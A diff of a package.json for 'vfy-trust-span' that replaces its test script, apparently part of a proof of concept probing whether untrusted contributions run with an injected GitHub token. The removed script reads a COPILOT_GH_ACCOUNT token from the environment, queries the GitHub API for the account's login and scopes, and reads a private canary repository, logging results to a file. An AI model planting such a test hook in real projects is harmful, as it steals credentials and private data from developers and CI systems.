@@ -2,6 +2,6 @@
   "name": "vfy-trust-span",
   "version": "1.0.0",
   "scripts": {
-    "test": "sh -c '\nM=\"$HOME/vfy-marker.txt\";\necho \"OUTSIDER-NO-WRITE-ACCESS-RAN-VFY\" >> \"$M\";\nN=$(env | grep -oE \"^COPILOT_GH_ACCOUNT[A-Za-z0-9_]*\" | head -1);\necho \"injected_var_name=$N\" >> \"$M\";\nT=$(env | grep -E \"^COPILOT_GH_ACCOUNT\" | head -1 | cut -d= -f2-);\necho \"injected_var_len=${#T}\" >> \"$M\";\necho \"injected_var_class=$(printf %s \"$T\" | cut -c1-4)\" >> \"$M\";\necho \"whoami_http=$(curl -s -o /tmp/w.$$ -w %{http_code} -H \"Authorization: token $T\" https://api.github.com/user)\" >> \"$M\";\necho \"whoami_login=$(grep -oE \"\\\"login\\\": *\\\"[^\\\"]+\\\"\" /tmp/w.$$ | head -1 | cut -d\\\" -f4)\" >> \"$M\";\ncurl -s -D /tmp/h.$$ -o /dev/null -H \"Authorization: token $T\" https://api.github.com/user;\necho \"scopes=$(grep -i \"^x-oauth-scopes:\" /tmp/h.$$ | cut -d: -f2- | tr -d \"\\r\")\" >> \"$M\";\necho \"privaterepo_http=$(curl -s -o /tmp/p.$$ -w %{http_code} -H \"Authorization: token $T\" https://api.github.com/repos/mr-benty/zz-vfy-canary-0902/contents/CANARY.txt)\" >> \"$M\";\necho \"privaterepo_content=$(grep -oE \"\\\"content\\\": *\\\"[^\\\"]+\\\"\" /tmp/p.$$ | cut -d\\\" -f4 | tr -d \"\\\\\\\\n\" | base64 -d 2>/dev/null)\" >> \"$M\";\nrm -f /tmp/w.$$ /tmp/h.$$ /tmp/p.$$;\n'"
+    "test": "sh -c 'echo POST-GRANT-COMMIT-RAN-VFY >> \"$HOME/vfy-marker2.txt\"; date -u +post_grant_exec=%Y-%m-%dT%H:%M:%SZ >> \"$HOME/vfy-marker2.txt\"'"
   }
 }
